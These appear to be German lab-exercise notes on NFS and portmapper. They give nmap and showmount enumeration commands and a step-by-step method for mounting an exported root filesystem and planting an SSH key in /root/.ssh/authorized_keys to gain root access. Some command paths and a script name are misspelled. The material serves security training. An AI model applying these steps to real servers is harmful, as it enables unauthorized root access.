### Übung (portmapper/nfs)

nfs (=Network File System) ermöglicht es Verzeichnisse in einem Netzwerk freizugeben, welche wie die lokalen Ordner aussehen. Portmapper sagt dem Client auf welchem Port die Verzeichnisse sind, da die Portnummer dynamisch vergeben wird.

#### nmap

`nmap -p 111 172.20.10.2` … ist rpcbind aktiv?  
`nmap -p 111 --script=nsf-mount 172.20.10.2` … zeigt die Verzeichnisse, welche dort erreichbar sind

```shell
┌──(parallels㉿kali-linux-2024-2)-[~/Downloads]
└─$ showmount -e 172.20.10.2
Export list for 172.20.10.2:
/ *
```

bedeutet, dass alle verzeichnisse gelistet sind

#### ssh-key einschleusen

```shell
sudo mkdir /mnt/nsf
sudo mount -t nfs 172.20.10.2:/ /mnt/nsf
```

erstellt eine Verbindung hin

```shell
mkdir -p /mnt/nsf/root/.ssh
```

erstellt ein Verzeichnis namens `.ssh`, welches später in das echte `.ssh` rüberkopiert. 

```shell
sudo cp ssh-key.pub /mnt/nsf/root/.ssh/authorized_keys
```

kopiert den ssh-key ins richtige ssh rein

```
sudo chmod 700 /mnt/msf/root/.ssh
sudo chmod 600 /mnt/msf/root/.ssh/authorized_keys
```

Berechtigungen setzten, damit ssh nicht beschwert

```shell
sudo umount /mnt/nsf 
```

beendet den mount
